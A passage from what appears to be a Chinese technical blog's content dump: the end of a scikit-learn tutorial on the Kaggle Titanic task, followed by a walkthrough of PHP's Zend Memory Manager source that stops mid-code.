训练\r\n\r\n机器学习的模型很多，用于分类有：\r\n\r\n1.  回归算法：Logistic Regression、 Ordinary Least Square等等。\r\n2.  决策树: CART、ID3、Random Forest等等。\r\n3.  贝叶斯：Navie Bayesian、BBN等等。\r\n4.  基于实例的算法：KNN、LVQ等等。\r\n5.  组合模型、关联规则、神经网络、深度学习等等。\r\n\r\n模型太多都看晕了，这种场景下选什么模型合适？因为我也不是很懂，所以大家可以自己查一下相关资料。在这里我选择了Random Forest和GBDT来试试。\r\n\r\n**Random Forest:**\r\n\r\n```python\r\nfrom sklearn.ensemble import RandomForestClassifier\r\nX = df[:input_df.shape[0]].values[:, 1::]\r\ny = df[:input_df.shape[0]].values[:, 0]\r\n\r\nX_test = df[input_df.shape[0]:].values[:, 1::]\r\nrandom_forest = RandomForestClassifier(oob_score=True, n_estimators=1000)\r\nrandom_forest.fit(X, y)\r\n\r\nY_pred = random_forest.predict(X_test)\r\nprint random_forest.score(X, y)\r\nsubmission = pd.DataFrame({\r\n\t    \"PassengerId\": X_origin[\"PassengerId\"],\r\n\t    \"Survived\": Y_pred.astype(int)\r\n\t})\r\nsubmission.to_csv('result.csv', index=False)\r\n```\r\n\r\n**GBDT:**\r\n\r\n```python\r\nfrom sklearn.ensemble import GradientBoostingClassifier\r\nX = df[:input_df.shape[0]].values[:, 1::]\r\ny = df[:input_df.shape[0]].values[:, 0]\r\n\r\nX_test = df[input_df.shape[0]:].values[:, 1::]\r\nGBDT = GradientBoostingClassifier(n_estimators=1000)\r\nGBDT.fit(X, y)\r\n\r\nY_pred = GBDT.predict(X_test)\r\nprint GBDT.score(X, y)\r\nsubmission = pd.DataFrame({\r\n\t    \"PassengerId\": X_origin[\"PassengerId\"],\r\n\t    \"Survived\": Y_pred.astype(int)\r\n\t})\r\nsubmission.to_csv('result.csv', index=False)\r\n```\r\n\r\n完成后在Kaggle提交，只有`0.74641`分。\r\n\r\n## 调优\r\n\r\n再观察一下数据，看看还有那些特征可以用到，又去Google了一番，整理出三个新特征：称谓、家庭大小、姓。\r\n\r\n**称谓:** 不同的称谓意味着不同的社会地位、不同的社会地位的人对人生、事物的理解不同。并且不同的社会地位乘坐逃生舱的概率也不同？可能某一类人的生存概率更高？\r\n\r\n**家庭大小:** 一家七个人的逃生概率大还是一家两个人的逃生概率大呢？人多的家庭会不会更难逃生呢？\r\n\r\n**姓:** 其实姓这个特征是为了辅助家庭这个特征的，同一个姓是一个家庭的概率更大？\r\n\r\n```python\r\n#处理姓\r\ndf['Surname'] = df['Name'].map(lambda x: re.compile(\"(Mr|Mrs|Miss|Master|Don|Rev|Dr|Mme|Ms|Major|Lady|Sir|Mlle|Col|Capt|the Countess|Jonkheer|Dona)\\\\.\\\\s(\\\\w*)\").findall(x)[0][1])\r\ndf['Surname'] = pd.factorize(df['Surname'])[0]\r\n#处理称谓\r\ndf['Title'] = df['Name'].map(lambda x: re.compile(\", (.*?)\\\\.\").findall(x)[0])\r\ndf['Title'][df.Title == 'Jonkheer'] = 'Master'\r\ndf['Title'][df.Title.isin(['Ms','Mlle'])] = 'Miss'\r\ndf['Title'][df.Title == 'Mme'] = 'Mrs'\r\ndf['Title'][df.Title.isin(['Capt', 'Don', 'Major', 'Col', 'Sir'])] = 'Sir'\r\ndf['Title'][df.Title.isin(['Dona', 'Lady', 'the Countess'])] = 'Lady'\r\ndf['Title_id'] = pd.factorize(df['Title'])[0]+1\r\ndf = df.drop(['Title'], axis=1)\r\ndf.drop(['Name'],axis=1,inplace=True)\r\ndf.drop(['Names'],axis=1,inplace=True)\r\n#处理家庭大小\r\ndf['FamilySize'] =  df[\"Parch\"] + df[\"SibSp\"] + 1\r\ndf['FamilySize'].loc[df['FamilySize'] < 3] = 'small'\r\ndf['FamilySize'].loc[df['FamilySize'] != 'small'] = 'big'\r\ndf['FamilySize'][df['FamilySize'] == 'small'] = 0\r\ndf['FamilySize'][df['FamilySize'] == 'big'] = 1\r\ndf['FamilySize'] = df['FamilySize'].astype(int)\r\n```\r\n\r\n之前的Age和Fare忘了做Scaling处理，也把它加上：\r\n\r\n```python\r\nfrom sklearn import preprocessing\r\nscaler = preprocessing.StandardScaler()\r\ndf['Fare_scaled'] = scaler.fit_transform(df['Fare'])\r\ndf = df.drop(['Fare'], axis=1)\r\ndf['Age_scaled'] = scaler.fit_transform(df['Age'])\r\ndf = df.drop(['Age'], axis=1)\r\n```\r\n\r\n下面我们看看目前这些特征的feature importance:\r\n\r\n```python\r\nfeatures_list = df.columns.values[1::]\r\n\r\n# Fit a random forest with (mostly) default parameters to determine feature importance\r\nforest = RandomForestClassifier(oob_score=True, n_estimators=10000)\r\nforest.fit(X, y)\r\nfeature_importance = forest.feature_importances_\r\n\r\n# make importances relative to max importance\r\nfeature_importance = 100.0 * (feature_importance / feature_importance.max())\r\n\r\n# Get the indexes of all features over the importance threshold\r\nimportant_idx = np.where(feature_importance)[0]\r\n\r\n# Get the sorted indexes of important features\r\nsorted_idx = np.argsort(feature_importance[important_idx])[::-1]\r\nprint \"\\\\nFeatures sorted by importance (DESC):\\\\n\", important_features[sorted_idx]\r\n\r\n# Adapted from <http://scikit-learn.org/stable/auto_examples/ensemble/plot_gradient_boosting_regression.html>\r\npos = np.arange(sorted_idx.shape[0]) + .5\r\nplt.subplot(1, 2, 2)\r\nplt.barh(pos, feature_importance[important_idx][sorted_idx[::-1]], align='center')\r\nplt.yticks(pos, important_features[sorted_idx[::-1]])\r\nplt.xlabel('Relative Importance')\r\nplt.title('Variable Importance')\r\nplt.show()\r\n```\r\n\r\n我们得到：\r\n\r\n![nwobWe](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/nwobWe.jpg)\r\n\r\n我们可以把后两个不重要的特征删掉：\r\n\r\n```python\r\ndf = df.drop(['Child', 'FamilySize'], axis=1)\r\n```\r\n\r\n下面是参数调优，Sklean提供了两种方法，GridSearch和RandomizedSearch。在这两种情况下，都可以指定每个参数的取值范围，创建一个字典。将参数字典提供给search方法，它就会执行模型所指定的值的组合。GridSearch会测试参数每一个可能的组合。 而RandomizedSearch需要指定有多少不同的组合要测试，然后随机选择并组合他们。\r\n\r\n```python\r\nfrom sklearn import grid_search\r\nsqrtfeat = int(np.sqrt(X.shape[1]))\r\nminsampsplit = int(X.shape[0]*0.015)\r\ndef report(grid_scores, n_top=5):\r\n    params = None\r\n    top_scores = sorted(grid_scores, key=itemgetter(1), reverse=True)[:n_top]\r\n    for i, score in enumerate(top_scores):\r\n        print(\"Parameters with rank: {0}\".format(i + 1))\r\n        print(\"Mean validation score: {0:.4f} (std: {1:.4f})\".format(\r\n              score.mean_validation_score, np.std(score.cv_validation_scores)))\r\n        print(\"Parameters: {0}\".format(score.parameters))\r\n        print(\"\")\r\n        \r\n        if params == None:\r\n            params = score.parameters\r\n    \r\n    return params\r\n# Simple grid test\r\ngrid_test1 = { \"n_estimators\"      : [5000, 10000, 20000],\r\n               \"criterion\"         : [\"gini\", \"entropy\"],\r\n               \"max_features\"      : [sqrtfeat-1, sqrtfeat, sqrtfeat+1],\r\n               \"max_depth\"         : [5, 10, 25],\r\n               \"min_samples_split\" : [2, 5, 10, minsampsplit ] }\r\n\r\nforest = RandomForestClassifier(oob_score=True)\r\n \r\nprint \"Hyperparameter optimization using GridSearchCV...\"\r\ngrid_search = grid_search.GridSearchCV(forest, grid_test1, n_jobs=-1, cv=10)\r\n\t\r\ngrid_search.fit(X, y)\r\nY_pred = grid_search.predict(X_test)\r\nprint grid_search.score(X, y)\r\n```\r\n\r\n由于我的机器太慢了，就忽略这一步了。\r\n\r\n最后，我使用Random Forest, 加上参数max_depth=5 防止模型过拟合，并将n_estimators放到了30000，再次跑了提交Kaggle，这次得到了`0.8038`：\r\n\r\n![Results](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/l1DnAD.jpg)\r\n\r\n## 验证：学习曲线\r\n\r\n最后我们用学习曲线(Learning Curves)验证一下该模型的准确率。\r\n\r\n方法很简单，我们逐步增加training data，标出training score(模型是否overfit)和error rate(模型预测的结果是否正确)。即可。继续重复这个过程，选出200、300、400、500等等个数据作为training data，然后标出training score和error rate，得出一个曲线，即学习曲线(Learning Curves)。\r\n\r\n下图是Professor Ng在coursea上[机器学习](https://www.coursera.org/course/ml)课程的ppt截图，描述了四种基本的曲线形状：\r\n\r\n![Learning Curves](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/xs44iQ.jpg)\r\n\r\n其中红线代表error rate，蓝线代表training score。\r\n\r\n> 1.左上角是最优情况，随着样本的增加，error rate和training score都降低。2.右上角是最差情况，模型几乎无法预测数据，重新调整参数吧。3.左下角是high variance的情况，模型不够稳定，不能很好的fit新数据。4.右下角是high bias的情况，模型无法预测出准确的结果。\r\n\r\n这里解释一下variance和bias的意思，引用[@Orangeprince](http://orangeprince.info/)的形象解释：\r\n\r\n> 首先 Error = Bias + Variance，Error反映的是整个模型的准确度，Bias反映的是模型在样本上的输出与真实值之间的误差，即模型本身的精准度，Variance反映的是模型每一次输出结果与模型输出期望之间的误差，即模型的稳定性。举一个例子，一次打靶实验，目标是为了打到10环，但是实际上只打到了7环，那么这里面的Error就是3。具体分析打到7环的原因，可能有两方面：一是瞄准出了问题，比如实际上射击瞄准的是9环而不是10环；二是枪本身的稳定性有问题，虽然瞄准的是9环，但是只打到了7环。那么在上面一次射击实验中，Bias就是1,反应的是模型期望与真实目标的差距，而在这次试验中，由于Variance所带来的误差就是2，即虽然瞄准的是9环，但由于本身模型缺乏稳定性，造成了实际结果与模型期望之间的差距。\r\n\r\nHigh variance，low bias意味着”overfitting”，模型过拟合导致不能很好的用于新数据。而High bias，low variance意味着”underfitting”，模型欠拟合导致不能很好从样本中学习，很难去预测新数据。Bias与Variance往往是不能兼得的。如果要降低模型的Bias，就一定程度上会提高模型的Variance，反之亦然。\r\n\r\n例如，如果模型存在high variance，一个常见的解决方法是给他增加更多的特征。但是这样也会增加bias，这中间的平衡需要仔细考虑。后面的链接提供了一些解决这类问题的方法。\r\n\r\n下面我们看看在scikit-learn中如何实现：\r\n\r\n```python\r\nfrom sklearn.learning_curve import learning_curve\r\ndef plot_learning_curve(estimator, title, X, y, ylim=None, cv=None,\r\n                        n_jobs=1, train_sizes=np.linspace(.1, 1.0, 5)):\r\n    \"\"\"\r\n    Generate a simple plot of the test and traning learning curve.\r\n\r\n    Parameters\r\n    ----------\r\n    estimator : object type that implements the \"fit\" and \"predict\" methods\r\n        An object of that type which is cloned for each validation.\r\n\r\n    title : string\r\n        Title for the chart.\r\n\r\n    X : array-like, shape (n_samples, n_features)\r\n        Training vector, where n_samples is the number of samples and\r\n        n_features is the number of features.\r\n\r\n    y : array-like, shape (n_samples) or (n_samples, n_features), optional\r\n        Target relative to X for classification or regression;\r\n        None for unsupervised learning.\r\n\r\n    ylim : tuple, shape (ymin, ymax), optional\r\n        Defines minimum and maximum yvalues plotted.\r\n\r\n    cv : integer, cross-validation generator, optional\r\n        If an integer is passed, it is the number of folds (defaults to 3).\r\n        Specific cross-validation objects can be passed, see\r\n        sklearn.cross_validation module for the list of possible objects\r\n\r\n    n_jobs : integer, optional\r\n        Number of jobs to run in parallel (default 1).\r\n    \"\"\"\r\n    plt.figure()\r\n    plt.title(title)\r\n    if ylim is not None:\r\n        plt.ylim(*ylim)\r\n    plt.xlabel(\"Training examples\")\r\n    plt.ylabel(\"Score\")\r\n    train_sizes, train_scores, test_scores = learning_curve(\r\n        estimator, X, y, cv=cv, n_jobs=n_jobs, train_sizes=train_sizes)\r\n    train_scores_mean = np.mean(train_scores, axis=1)\r\n    train_scores_std = np.std(train_scores, axis=1)\r\n    test_scores_mean = np.mean(test_scores, axis=1)\r\n    test_scores_std = np.std(test_scores, axis=1)\r\n    plt.grid()\r\n\r\n    plt.fill_between(train_sizes, train_scores_mean - train_scores_std,\r\n                     train_scores_mean + train_scores_std, alpha=0.1,\r\n                     color=\"r\")\r\n    plt.fill_between(train_sizes, test_scores_mean - test_scores_std,\r\n                     test_scores_mean + test_scores_std, alpha=0.1, color=\"g\")\r\n    plt.plot(train_sizes, train_scores_mean, 'o-', color=\"r\",\r\n             label=\"Training score\")\r\n    plt.plot(train_sizes, test_scores_mean, 'o-', color=\"g\",\r\n             label=\"Cross-validation score\")\r\n\r\n    plt.legend(loc=\"best\")\r\n    return plt\r\ntitle = \"Learning Curves\"\r\nplot_learning_curve(RandomForestClassifier(oob_score=True, n_estimators=30000, max_depth=5), title, X, y, ylim=(0.5, 1.01), cv=None, n_jobs=4, train_sizes=[50, 100, 150, 200, 250, 350, 400])\r\nplt.show()\r\n```\r\n\r\n我们得到：\r\n\r\n![Learning Curves Result](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/K5fsQU.jpg)\r\n\r\n## 总结\r\n\r\n还有许多可以优化的地方，通过实战才能发现学习中不足的地方。\r\n"},{"fields":{"slug":"/博客/Archive/理解PHP内存管理/","title":"理解PHP内存管理"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: 理解PHP内存管理\r\ntags:\r\n  - 博客\r\n  - PHP\r\n  - 内存管理\r\n---\r\n\r\n# 内存管理概述\r\n\r\n内存管理，是指软件运行时对计算机内存资源的分配和使用的技术。其最主要的目的是如何高效，快速的分配，并且在适当的时候释放和回收内存资源。\r\n\r\n在使用C/C++开发程序的时候，需要格外注意内存管理，申请了内存再使用完后要记得释放，否则可能会造成内存泄漏。如果程序需要常驻内存，那么内存泄漏问题会把机器的内存耗光。所以在PHP这种需要常驻内存的程序来说，内存管理非常重要，它决定了程序的稳定性和执行效率。另外，应用程序向系统申请内存，释放内存的时候会引发系统调用，系统调用提供用户程序与操作系统之间的接口，他会触发0x80 号中断（int 0x80）将CPU从用户态切换到内核态，执行完毕再切换回用户态。在PHP这种对性能要求较高的程序来说，频繁在用户态和内核态切换会带来很大的性能消耗。\r\n\r\n介于以上原因，PHP实现了自己的内存管理器（ZendMM）, 所以在编写PHP脚本的时候我们不需要对内存进行管理。\r\n\r\n# ZendMM\r\n\r\n```\r\nZend Memory Manager\r\n===================\r\n\r\nGeneral:\r\n--------\r\n\r\nThe goal of the new memory manager (available since PHP 5.2) is to reduce memory\r\nallocation overhead and speedup memory management.\r\n```\r\n\r\nPHP的内存管理是分层的，它分为三层：存储层（storage）、堆层（heap）和接口层（emalloc/efree）。存储层通过 malloc()、mmap() 等函数向系统真正的申请内存，并通过 free() 函数释放所申请的内存。存储层通常一次申请大量内存，这样接口层在需要分配空间的时候，通过堆层将存储层申请到的内存进行拆分，按照大小给接口层使用。在存储层共有4种内存分配方案: malloc，win32，mmap_anon，mmap_zero。默认使用malloc分配内存，如果设置了ZEND_WIN32宏，则为windows版本，调用HeapAlloc分配内存。并且PHP的内存方案可以通过设置变量来修改。\r\n\r\n```\r\nthe Zend MM can be tweaked using ZEND_MM_MEM_TYPE and ZEND_MM_SEG_SIZE environment\r\nvariables.  Default values are \"malloc\" and \"256K\". Dependent on target system you\r\ncan also use \"mmap_anon\", \"mmap_zero\" and \"win32\" storage managers.\r\n\r\n  $ ZEND_MM_MEM_TYPE=mmap_anon ZEND_MM_SEG_SIZE=1M sapi/cli/php ..etc.\r\n```\r\n\r\n借用一张图来说明一下：\r\n\r\n![4PFj1W](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/4PFj1W.jpg)\r\n\r\n内存分配有两种类型：\r\n\r\n1. small, 为了速度和效率。\r\n2. large, 为了不造成浪费。\r\n\r\n内存分配有两种生命周期：\r\n\r\n1. request，最常见的情况，只需要满足当前请求的内存需求，一次请求结束之后就free。\r\n2. persistent，需要被分配比单个请求持续时间更长的一段时间的内存，这种情况下使用操作系统的malloc来分配内存，这些分配的内存并不会添加ZendMM使用的那些额外的信息，从而实现永久分配。\r\n\r\nZendMM提供的request内存分配相关函数：\r\n\r\n```\r\nvoid*  emalloc(size_t size);\r\nvoid*  erealloc(void* pointer, size_t size);\r\nvoid*  ecalloc(size_t num, size_t count);\r\nvoid   efree(void* pointer);\r\n```\r\n\r\nZendMM提供的persistent内存分配相关函数：\r\n\r\n```\r\nvoid* pemalloc(size_t size, zend_bool persistent);\r\nvoid* perealloc(void* pointer, size_t size, zend_bool persistent);\r\nvoid* pecalloc(size_t num, size_t count, zend_bool persistent);\r\nvoid  pefree(void* pointer, zend_bool persistent);\r\n```\r\n\r\n# 存储层（storage）\r\n\r\n存储层（storage）是向系统真正的申请内存，它的作用是将内存分配的方式对堆层透明化。我们先看看它的结构。\r\n\r\n```\r\n/* Heaps with user defined storage */\r\ntypedef struct _zend_mm_storage zend_mm_storage;\r\n\r\ntypedef struct _zend_mm_segment {\r\n  size_t  size;\r\n  struct _zend_mm_segment *next_segment;\r\n} zend_mm_segment;\r\n\r\ntypedef struct _zend_mm_mem_handlers {\r\n  const char *name;\r\n  zend_mm_storage* (*init)(void *params);\r\n  void (*dtor)(zend_mm_storage *storage);\r\n  void (*compact)(zend_mm_storage *storage);\r\n  zend_mm_segment* (*_alloc)(zend_mm_storage *storage, size_t size);\r\n  zend_mm_segment* (*_realloc)(zend_mm_storage *storage, zend_mm_segment *ptr, size_t size);\r\n  void (*_free)(zend_mm_storage *storage, zend_mm_segment *ptr);\r\n} zend_mm_mem_handlers;\r\n\r\nstruct _zend_mm_storage {\r\n  const zend_mm_mem_handlers *handlers;\r\n  void *data;\r\n};\r\n```\r\n\r\n我们看看存储层（storage）的初始化函数zend_mm_startup():\r\n\r\n```\r\nZEND_API zend_mm_heap *zend_mm_startup(void)\r\n{\r\n  int i;\r\n  size_t seg_size;\r\n  char *mem_type = getenv(\"ZEND_MM_MEM_TYPE\"); //内存分配方案\r\n  char *tmp;\r\n  const zend_mm_mem_handlers *handlers;\r\n  zend_mm_heap *heap;\r\n\r\n  if (mem_type == NULL) { //默认使用malloc为分配方案，也就是0\r\n    i = 0;\r\n  } else {\r\n    for (i = 0; mem_handlers[i].name; i++) {\r\n      if (strcmp(mem_handlers[i].name, mem_type) == 0) { \r\n        break;\r\n      }\r\n    }\r\n    if (!mem_handlers[i].name) {\r\n      fprintf(stderr, \"Wrong or unsupported zend_mm storage type '%s'\\n\", mem_type);\r\n      fprintf(stderr, \"  supported types:\\n\");\r\n/* See http://support.microsoft.com/kb/190351 */\r\n#ifdef PHP_WIN32\r\n      fflush(stderr);\r\n#endif\r\n      for (i = 0; mem_handlers[i].name; i++) {\r\n        fprintf(stderr, \"    '%s'\\n\", mem_handlers[i].name);\r\n      }\r\n/* See http://support.microsoft.com/kb/190351 */\r\n#ifdef PHP_WIN32\r\n      fflush(stderr);\r\n#endif\r\n      exit(255);\r\n    }\r\n  }\r\n  handlers = &mem_handlers[i];\r\n  //使用相应内存分配方案的handler，mem_handlers是结构体zend_mm_mem_handlers\r\n\r\n  tmp = getenv(\"ZEND_MM_SEG_SIZE\"); \r\n  if (tmp) {\r\n    seg_size = zend_atoi(tmp, 0);\r\n    if (zend_mm_low_bit(seg_size) != zend_mm_high_bit(seg_size)) {\r\n      fprintf(stderr, \"ZEND_MM_SEG_SIZE must be a power of two\\n\");\r\n/* See http://support.microsoft.com/kb/190351 */\r\n#ifdef PHP_WIN32\r\n      fflush(stderr);\r\n#endif\r\n      exit(255);\r\n    } else if (seg_size < ZEND_MM_ALIGNED_SEGMENT_SIZE + ZEND_MM_ALIGNED_HEADER_SIZE) {\r\n      fprintf(stderr, \"ZEND_MM_SEG_SIZE is too small\\n\");\r\n/* See http://support.microsoft.com/kb/190351 */\r\n#ifdef PHP_WIN32\r\n      fflush(stderr);\r\n#endif\r\n      exit(255);\r\n    }\r\n  } else {\r\n    seg_size = ZEND_MM_SEG_SIZE; //段分配大小，未指定的话默认为ZEND_MM_SEG_SIZE，即(256 * 1024)\r\n  }\r\n\r\n  heap = zend_mm_startup_ex(handlers, seg_size, ZEND_MM_RESERVE_SIZE, 0, NULL);\r\n  //初始化heap\r\n  if (heap) {\r\n    tmp = getenv(\"ZEND_MM_COMPACT\"); \r\n    if (tmp) {\r\n      heap->compact_size = zend_atoi(tmp, 0);\r\n    } else {\r\n      heap->compact_size = 2 * 1024 * 1024;\r\n    }\r\n  }\r\n  return heap;\r\n}\r\n```\r\n\r\n其中mem_handlers里面是4种内存分配方案：\r\n\r\n![4r26LI](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/4r26LI.jpg)\r\n\r\n# 堆层（heap）\r\n\r\n我们先看看heap的结构：\r\n\r\n```\r\nstruct _zend_mm_heap {\r\n    int                 use_zend_alloc;\r\n    void               *(*_malloc)(size_t);\r\n    void                (*_free)(void*);\r\n    void               *(*_realloc)(void*, size_t);\r\n    size_t              free_bitmap;\r\n    size_t              large_free_bitmap;\r\n    size_t              block_size;\r\n    size_t              compact_size;\r\n    zend_mm_segment    *segments_list;\r\n    zend_mm_storage    *storage;\r\n    size_t              real_size;\r\n    size_t              real_peak;\r\n    size_t              limit;\r\n    size_t              size;\r\n    size_t              peak;\r\n    size_t              reserve_size;\r\n    void               *reserve;\r\n    int                 overflow;\r\n    int                 internal;\r\n#if ZEND_MM_CACHE\r\n    unsigned int        cached;\r\n    zend_mm_free_block *cache[ZEND_MM_NUM_BUCKETS];\r\n#endif\r\n    zend_mm_free_block *free_buckets[ZEND_MM_NUM_BUCKETS*2];\r\n    zend_mm_free_block *large_free_buckets[ZEND_MM_NUM_BUCKETS];\r\n    zend_mm_free_block *rest_buckets[2];\r\n    int                 rest_count;\r\n#if ZEND_MM_CACHE_STAT\r\n    struct {\r\n        int count;\r\n        int max_count;\r\n        int hit;\r\n        int miss;\r\n    } cache_stat[ZEND_MM_NUM_BUCKETS+1];\r\n#endif\r\n};\r\n```\r\n\r\n其中free_buckets 和 large_free_buckets 是关键，它们分别是小块内存列表和大块内存列表，在接口层申请内存的时候，ZendMM会在heap层中搜索合适大小的内存块，small类型的使用free_buckets，large类型则使用large_free_buckets，如果都没有足够的内存的话，就使用rest_buckets。经过以上步骤还没有合适的资源的话，使用ZEND_MM_STORAGE_ALLOC函数向系统再申请一块内存。\r\n\r\n之前的zend_mm_startup()函数调用zend_mm_startup_ex()来初始化堆层（heap），这里我们只说一下其中的zend_mm_init()，我们看看它的实现：\r\n\r\n```\r\nstatic inline void zend_mm_init(zend_mm_heap *heap)\r\n{\r\n  zend_mm_free_block* p;\r\n  int i;\r\n\r\n  heap->free_bitmap = 0; //小块空闲内存标识\r\n  heap->large_free_bitmap = 0; //大块空闲内存标识\r\n#if ZEND_MM_CACHE\r\n  heap->cached = 0;\r\n  memset(heap->cache, 0, sizeof(heap->cache));\r\n#endif\r\n#if ZEND_MM_CACHE_STAT\r\n  for (i = 0; i < ZEND_MM_NUM_BUCKETS; i++) {\r\n    heap->cache_stat[i].count = 0;\r\n  }\r\n#endif\r\n  p = ZEND_MM_SMALL_FREE_BUCKET(heap, 0);\r\n  for (i = 0; i < ZEND_MM_NUM_BUCKETS; i++) {\r\n    p->next_free_block = p;\r\n    p->prev_free_block = p;\r\n    p = (zend_mm_free_block*)((char*)p + sizeof(zend_mm_free_block*) * 2);\r\n    heap->large_free_buckets[i] = NULL;\r\n  }\r\n  heap->rest_buckets[0] = heap->rest_buckets[1] = ZEND_MM_REST_BUCKET(heap);\r\n  heap->rest_count = 0;\r\n}\r\n```\r\n\r\n我们先看看鸟哥画的Heap结构图：\r\n\r\n![TJ6pEQ](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/TJ6pEQ.jpg)\r\n\r\n再回到zend_mm_init()，这里同时初始化free_buckets 和 large_free_buckets。其实他们就像Hashtable一样，每个bucket也对应一定大小的内存块列表。\r\n\r\nfree_buckets使用宏`ZEND_MM_SMALL_FREE_BUCKET`来管理分配小块内存：\r\n\r\n```\r\n#define ZEND_MM_SMALL_FREE_BUCKET(heap, index) \\\r\n  (zend_mm_free_block*) ((char*)&heap->free_buckets[index * 2] + \\\r\n    sizeof(zend_mm_free_block*) * 2 - \\\r\n    sizeof(zend_mm_small_free_block))\r\n```\r\n\r\nfree_buckets是一个数组指针，它存储的是指向zend_mm_free_block结构体的指针，他们以两个为一对，分别存储双向链表的头尾指针。如图：\r\n\r\n![DDTZ3s](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/DDTZ3s.jpg)\r\n\r\n这里的初始化非常巧妙，我们先看看`ZEND_MM_SMALL_FREE_BUCKET`，它是将free_buckets列表的偶数位的内存地址(也就是指向prev_free_block的地址)加上两个指针的内存大小并减去zend_mm_small_free_block结构所占空间的大小。而因为zend_mm_free_block结构和zend_mm_small_free_block结构的差距在于两个指针，所以他的计算结果就是free_buckets列表index对应双向链表的第一个zend_mm_free_block的prev_free_block地址减8的地址。为什么是减8的地址？因为zend_mm_free_block的前8个字节是zend_mm_block_info，之后才是prev_free_block。两个结构体如下：\r\n\r\n```\r\ntypedef struct _zend_mm_small_free_block {\r\n  zend_mm_block_info info;\r\n#if ZEND_DEBUG\r\n  unsigned int magic;\r\n# ifdef ZTS\r\n  THREAD_T thread_id;\r\n# endif\r\n#endif\r\n  struct _zend_mm_free_block *prev_free_block;\r\n  struct _zend_mm_free_block *next_free_block;\r\n} zend_mm_small_free_block;\r\n\r\ntypedef struct _zend_mm_free_block {\r\n  zend_mm_block_info info;\r\n#if ZEND_DEBUG\r\n  unsigned int magic;\r\n# ifdef ZTS\r\n  THREAD_T thread_id;\r\n# endif\r\n#endif\r\n  struct _zend_mm_free_block *prev_free_block;\r\n  struct _zend_mm_free_block *next_free_block;  \r\n \r\n  struct _zend_mm_free_block **parent;         \r\n  struct _zend_mm_free_block *child[2];         \r\n} zend_mm_free_block;\r\n```\r\n\r\n为了方面理解，看下图。我们假设index为0的情况，&heap->free_buckets[0] 的地址为0x881260，加上sizeof(zend_mm_free_block*)* 2 再减去sizeof(zend_mm_small_free_block))的结果 0x881258，它是&heap->free_buckets[0]地址减8的地址，它指向的结构体 zend_mm_free_block，所以p->prev_free_block指向的就是0x881260，也就是heap->free_buckets[0]。\r\n\r\n![b87C4t](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/b87C4t.jpg)\r\n\r\n接着后面的代码：\r\n\r\n```\r\np = ZEND_MM_SMALL_FREE_BUCKET(heap, 0);\r\nfor (i = 0; i < ZEND_MM_NUM_BUCKETS; i++) {\r\n    p->next_free_block = p;\r\n    p->prev_free_block = p;\r\n    p = (zend_mm_free_block*)((char*)p + sizeof(zend_mm_free_block*) * 2);\r\n    heap->large_free_buckets[i] = NULL;\r\n}\r\n```\r\n\r\n在这个循环中，free_buckets的偶数位index，将其next_free_block和prev_free_block都指向自己，通过两个指针的大小(sizeof(zend_mm_free_block*)* 2)实现数组元素的向后移动，index 0->2->4->……->62 。这种不存储zend_mm_free_block数组，仅存储其指针的方式不可不说精妙。虽然在理解上有一些困难，但是节省了内存。鸟哥是这样说的：\r\n\r\n> this is a tricky way to store ZEND_MM_NUMER_BUCKET into a fixed length array. \r\nand only the prev_free_block and next_free_block will be use in that way, looking at the picture above, the red box. \r\nso actually there is same ZEND_MM_NUMBER_BUCKET buckets stored in the free_buckets array.\r\n> \r\n\r\n所以上一张图所示的free_buckets，在经过初始化后，内容为：\r\n\r\n![qgXzU4](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-02/qgXzU4.jpg)\r\n\r\n# 接口层（emalloc/efree）\r\n\r\nPHP实现了emalloc、efree等函数，当程序需要内存的时候，ZendMM会在内存池中分配相应的内存，这样避免了PHP向系统频繁的内存申请操作，节省了系统开销。\r\n\r\nZendMM在分配内存主要是有以下步骤：\r\n\r\n**1：** 计算出ture_size，即内存对齐。如果所需要的内存的大小的低三位不为0（不能为8整除），则将低三位加上7，并与~7进行按位与操作，即对于大小不是8的整数倍的内存大小补全到可以被8整除。\r\n\r\n```\r\n#define ZEND_MM_TRUE_SIZE(size)             ((size<ZEND_MM_MIN_SIZE)?(ZEND_MM_ALIGNED_MIN_HEADER_SIZE):(ZEND_MM_ALIGNED_SIZE(size+ZEND_MM_ALIGNED_HEADER_SIZE+END_MAGIC_SIZE)))\r\n```\r\n\r\n**2：** 通过`ZEND_MM_MAX_SMALL_SIZE`判断出内存大小类型是small还是large，如果是small，则跳到3，large跳到6。(之前也有写到，小于272Byte的内存为小块内存)\r\n\r\n**3：** 计算出要申请的内存大小对应的index。\r\n\r\n它的相关函数(即需要分配的内存大小对应的index)为：\r\n\r\n```\r\n#define ZEND_MM_BUCKET_INDEX(true_size) ((true_size>>ZEND_MM_ALIGNMENT_LOG2)-(ZEND_MM_ALIGNED_MIN_HEADER_SIZE>>ZEND_MM_ALIGNMENT_LOG2))\r\n```\r\n\r\n在默认情况下，ZEND_MM_ALIGNMENT = 8，ZEND_MM_ALIGNMENT_LOG2 = 3，ZEND_MM_ALIGNED_MIN_HEADER_SIZE = 16。通过这个宏可以知道，内存大小与index的关系是：\r\n\r\n| 内存大小 | index |\r\n| --- | --- |\r\n| 1 - 23 | 0 |\r\n| 24 - 31 | 1 |\r\n| 32 - 39 | 2 |\r\n| … | … |\r\n| 264 - 271 | 31 |\r\n\r\n所以，小于272Byte的内存为小块内存。如果大于271Byte的话，则index为32，会使free_buckets数组越界。这样，ZendMM就可以快速定位到最可能适合的区域来查找，提高性能。就像哈希函数一样。\r\n\r\n**4：** 如果Cache存在的话，即heap→cache[index]存在，则使用这片cache。（CACHE默认开启）\r\n\r\n```\r\nbest_fit = heap->cache[index];\r\n```\r\n\r\n**5：**如果未找到Cache，则从free_buckets查找是否存在空闲内存。\r\n\r\n```\r\nbitmap = heap->free_bitmap >> index;\r\n    if (bitmap) {\r\n     